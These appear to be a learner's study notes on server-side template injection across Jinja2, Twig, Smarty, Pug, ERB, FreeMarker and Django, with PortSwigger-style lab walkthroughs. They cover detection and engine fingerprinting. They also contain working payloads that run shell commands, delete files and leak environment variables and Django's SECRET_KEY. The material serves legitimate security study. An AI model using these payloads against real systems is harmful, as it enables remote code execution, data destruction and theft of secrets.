
SSTI - an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. SSTIs can occur when user input is concatenated directly into a template, rather than passed in as data. 
- Not vulnerable - templates that simply provide placeholders into which dynamic content is rendered
- Ex: `$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`
	- This is an email generator example
- Vulnerable - when user input is concatenated into templates prior to rendering
- Ex: `$output = $twig->render("Dear " . $_GET['name']);`
	- potentially allows an attacker to place a server-side template injection payload inside the `name` parameter as follows: `http://vulnerable-website.com/?name={{bad-stuff-here}}`

## Detect
Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`
- If *an exception is raised*, input potentially being interpreted by the server in some way

Two contexts:
- **Plaintext context** - Your input is treated as literal text to be displayed on the screen. It is usually placed between standard HTML tags or template delimiters.
	- *Example Template*: `<h1>Welcome, {{ user_name }}!</h1>`
	- *The Intent*: The developer expects "Alice" or "Bob."
	- *The Vulnerability:* Since the engine is looking for a variable to print, an attacker can provide a mathematical expression or a command.
	- *The Attack:* If the attacker provides `{{ 7*7 }}`, the page renders: `<h1>Welcome, 49!</h1>`.
	- *Goal:* The attacker must first "break out" of the intended text display by using the engine's specific tags (like `{{ }}` or `${ }`) to force the server to execute code.
- **Code context** - (*more dangerous*) - input lands **inside** an existing statement or logic block that the template engine is already executing. You don't need to "break out" because you are already "in."
	- *Example Template:* `{% if user.role == 'admin' or user.name == 'USER_INPUT' %}`
	- *The Intent:* The developer is checking a name to see if they should show specific content.
	- *The Vulnerability:* The input is already being processed as part of a logic check.
	- *The Attack:* An attacker doesn't need `{{ }}`. They can provide: `' or 7*7==49 or '`.
	- *The Resulting Logic:* `if user.role == 'admin' or user.name == '' or 7*7==49 or ''`
	- *Goal:* The attacker uses specific syntax (like quotes or parentheses) to manipulate the existing logic, often leading to **(RCE)** much faster than in plaintext contexts.

![](/assets/images/Server-Side%20Template%20Injection/code_context_example.png)

## Identify Template Engine
Submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version.
- Otherwise, you'll need to *manually test different language-specific payloads* and study how they are interpreted by the template engine. narrow down the options using process of elimination based on which syntax appears to be valid or invalid.
- For example, the payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2.
### Template Engines
Consider a message to a friend where you use a template with placeholders for the name, age, and message. A template engine works similarly:
1. **Template**: The engine uses a pre-designed template with placeholders like `{{ name }}` for dynamic content.
2. **User Input**: The engine receives user input (like a name, age, or message) and stores it in a variable.
3. **Combination**: The engine combines the template with the user input, replacing the placeholders with the actual data.
4. **Output**: The engine generates a final, dynamic web page with the user's input inserted into the template.

Here are some of the most commonly used template engines:
#### Jinja
**Python**
- Jinja2 evaluates expressions within curly braces `{{ }}`, which can execute arbitrary Python code if crafted maliciously.
- `{{7*7}}` = 7777777
- Then: `{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`
	- `"".__class__.__mro__[1]` accesses the base `object` class, the superclass of all Python classes.
	- `__subclasses__()`: Lists all subclasses of `object`, and `[157]` is typically the index for the `subprocess.Popen` class (this index may vary and should be checked in the target environment).
**check_output Usage**:
The `check_output` function is designed to enhance security by separating the command from its arguments, which helps to prevent shell injection attacks. Here's the general syntax:

```python
subprocess.check_output([command, arg1, arg2])
```

- **command**: A string that specifies the command to execute.
- **arg1, arg2, ...**: Additional arguments that should be passed to the command.
To properly execute the `ls` command with options using `check_output`, you should pass the command and its arguments as separate elements in a list:

```python
subprocess.check_output(['ls', '-lah'])
```

#### Twig
**PHP**
	- `{{7*'7'}}` = 49
#### Smarty
**PHP**
	- Try `{'Hello'|upper}`, if it says `HELLO` it's Smarty
	- Then try `{system("ls")}`
#### Pug/Jade
**Node.js**
- Allows embedding JavaScript directly within templates using interpolation braces `#{}`.
- Automatic escaping for certain inputs, converting characters like `<`, `>`, and `&` to their HTML entity equivalents to prevent XSS attacks. However, this default behaviour does not cover all potential security issues, particularly when dealing with unescaped interpolation `!{}` or complex input scenarios.
- Test with: `#{7*7}` = 49
- Allows JavaScript interpolation, we can then use the payload:`#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}`
	 - `root.process` accesses the global `process` object from Node.js within the Pug template.
	- `mainModule.require('child_process')` dynamically requires the `child_process` module, bypassing potential restrictions that might prevent its regular inclusion.
	- `spawnSync('ls')`: Executes the `ls` command synchronously.
	- `.stdout`: Captures the standard output of the command, which includes the directory listing.

**Correct Usage of spawnSync**
To correctly use `spawnSync` to execute the `ls` command with `-lah` argument, you should separate the command and its arguments into two distinct parts:

```javascript
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```
This structure ensures that the `ls` command is called with `-lah` as its argument, allowing the command to function as intended. So, the final payload will then be `#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`


## Process
1. Read the documentation (lame)
	1. Learn the basic syntax
	2. Read about the security implications
	3. Check documented Exploits
2. Explore the environment
3. Create a custom attack

## Lab: Basic server-side template injection
**Solution:** `GET /?message=<%=+exec("rm+/home/carlos/morale.txt")%>`

- Checked output of `GET /?message=${{<%[%'"}}%\` and noticed that `<%` did not appear
- Attempting to use `<%...%>` to execute anything - `GET /?message=<%= 7*7%>`
- Tried things until I got an error that included `/usr/lib/ruby/2.7.0/erb.rb` in respinse
	- Ruby is language and erb is framework
- Looked up SSTI and ERB
- Got the solution


## Lab: Basic server-side template injection (code context)

![](/assets/images/Server-Side%20Template%20Injection/SSTI_code_context.png)


- Changing the display name in the `/my-account` page changes the value of  `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`.
- If you put in `{{ 7*7 }}` you get `{{ 49 }}`
- ==key thing here is to terminate the statement and start a new one== - `user.name}}{%25import+os...`
	- It is `{%25import+os...` rather than `{% import+os...` bc it needs to be URL-encoded
- **Solution:** `blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`
- ==Note also to create two statements with sets of {{}}==


## Lab: Server-side template injection using documentation
 - Should have known from the creds (`content-manager:C0nt3ntM4n4g3r`) that there would be something going on with the posts
 - ~~Use [this](https://www.cobalt.io/hubfs/0_pJf0zn5ChHY9X8sF-1-png-1.png) cheat sheet to find Mako is the template engine (`${"z".join("ab")}`)~~
 - That was wrong, need to check error outputs and see that `FreeMarker` is the template
 - At that point you can go to [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=freemarker#freemarker-java) and see *a* solution
 - **Solution:** `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}`
 - In practice, this is how the solution will be handled, but they want you to:
	 - Go to the FAQ and notice how the `new()` built-in can be dangerous
	 - THe go to the "Built-in reference" section of the documentation and find the entry for `new()`, which describes how it is a security concern because it can be used to create arbitrary Java objects that implement the `TemplateModel` interface
	 - Load the JavaDoc for the `TemplateModel` class and review the list of "All Known Implementing Classes" 
	 - Observe that there is a class called `Exectute` which can be used to execute arbitrary commands
	 - *Then create your own or use theirs*

## Lab: Server-side template injection in an unknown language with a documented exploit
**Remember that it is a documented exploit**
- I should have tried to fix [this one on HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=freemarker#handlebars-nodejs)rather than keep looking around. 
- Essentially we would just sub out the `whoami` command for `rm /home/carlos/morale.txt`


## Lab: Server-side template injection with information disclosure via user-supplied objects
- Many *template engines expose a "self" or "environment"* object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. 
- Ex: Java-based templating languages list all variables in the environment using this injection: `${T(java.lang.System).getenv()}`
- Note that websites will contain both ==built-in objects provided by the template and custom, site-specific objects that have been supplied by the dev==. These may be more likely to expose sensitive information. 

**Steps:**
- Login and go to the product, click `Edit Template` and see `Only {{product.stock}} left of {{product.name}} at {{product.price}}.`
- `{{product.values}}` returns `['$88.79', 'Com-Tool', 910]`
- Error message says `django`
- Googled "django SSTI" and it had that result
- **Solution:** `{{+settings.SECRET_KEY+}}`


## Automating
**SSTImap** is a tool that automates the process of testing and exploiting SSTI vulnerabilities in various template engines. Hosted on [GitHub](https://github.com/vladko312/SSTImap), it provides a framework for discovering template injection flaws.
```bash
python3 sstimap.py -X POST -u 'http://page.com:8080/directory/' -d 'page='
```
- I never got this working


https://github.com/DeepMountains/Mirage/blob/main/CVE2-2.md